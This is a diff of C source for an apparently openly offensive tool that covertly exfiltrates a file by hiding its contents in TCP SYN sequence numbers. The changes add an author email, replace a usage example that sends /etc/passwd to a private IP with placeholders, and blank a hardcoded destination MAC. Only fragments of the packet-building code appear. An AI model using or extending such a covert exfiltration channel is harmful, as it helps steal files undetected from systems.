@@ -5,7 +5,7 @@
  *
  * Exfiltrates a given file using TCP seq numbers of SYN packets using a given codification technique.
  *
- * (c) spinfoo
+ * (c) spinfoo <spinfoo.vuln@gmail.com>
  */
 
 
@@ -25,7 +25,7 @@
 #define VERSION "1.2"
 
 void usage(char *name) {
-	fprintf(stderr, "usage: %s -i eth0 -d 192.168.0.158 -f /etc/passwd -p 8080 -P 8081\n", name);
+	fprintf(stderr, "usage: %s -i interface -d dst_ip -f file_to_exfiltrate -p dst_port -P src_port\n", name);
 }
 
 void error(char *cmd, char *name) {
@@ -54,7 +54,8 @@ int main(int argc, char *argv[]) {
     int seq;
     int pkt;
     u_char enet_src[6];
-    u_char enet_dst[6] = {0x00, 0x0c, 0x29, 0xb3, 0x45, 0x6e};
+    // Write below server MAC address: TODO do it automatic....
+    u_char enet_dst[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
     struct libnet_ether_addr *mac_src;
     
 	src_ip  = 0;
@@ -196,7 +197,7 @@ int main(int argc, char *argv[]) {
         if ((src_ip = libnet_get_ipaddr4(l)) == -1) {
     		lerror("Unable to determine own IP address", l);
         }
-	  
+
 		t = libnet_build_ethernet(
             enet_dst,                                   /* ethernet destination */
             enet_src,                                   /* ethernet source */
